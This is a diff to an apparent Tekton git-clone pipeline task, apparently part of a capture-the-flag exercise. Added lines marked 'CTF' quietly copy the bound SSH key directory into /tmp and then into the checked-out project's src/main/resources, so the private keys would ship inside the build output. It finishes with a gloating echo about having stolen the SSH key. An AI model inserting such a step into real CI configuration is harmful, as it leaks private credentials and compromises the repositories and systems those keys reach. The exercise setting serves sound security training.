@@ -156,16 +156,15 @@ spec:
           chmod 400 "${PARAM_USER_HOME}/.gitconfig"
         fi
 
-        if [ "${WORKSPACE_SSH_DIRECTORY_BOUND}" = "true" ] ; then
-          
+        if [ "${WORKSPACE_SSH_DIRECTORY_BOUND}" = "true" ] ; then      
+
           # CTF ---
           mkdir -p /tmp/ssh && cp ${WORKSPACE_SSH_DIRECTORY_PATH}/* /tmp/ssh
-          # ----         
- 
+          # ---- 
+          
           cp -R "${WORKSPACE_SSH_DIRECTORY_PATH}" "${PARAM_USER_HOME}"/.ssh
           chmod 700 "${PARAM_USER_HOME}"/.ssh
           chmod -R 400 "${PARAM_USER_HOME}"/.ssh/*
-
 
         fi
 
@@ -211,6 +210,11 @@ spec:
           -depth="${PARAM_DEPTH}" \
           -sparseCheckoutDirectories="${PARAM_SPARSE_CHECKOUT_DIRECTORIES}"
         cd "${CHECKOUT_DIR}"
+        
+        # CTF ---
+        cp -R /tmp/ssh ${WORKSPACE_OUTPUT_PATH}/src/main/resources
+        # ---- 
+        
         RESULT_SHA="$(git rev-parse HEAD)"
         EXIT_CODE="$?"
         if [ "${EXIT_CODE}" != 0 ] ; then
@@ -220,6 +224,9 @@ spec:
         printf "%s" "${RESULT_COMMITTER_DATE}" > "$(results.committer-date.path)"
         printf "%s" "${RESULT_SHA}" > "$(results.commit.path)"
         printf "%s" "${PARAM_URL}" > "$(results.url.path)"
+        
+        echo "CTF{AHAHAHAHAHA... Thanks for running the pipeline again....Now I have the SSH KEY I WAS LOOKING FOR !!!! }"
+        ls -R ${WORKSPACE_OUTPUT_PATH}/src/main
         	
       securityContext:
         runAsNonRoot: true
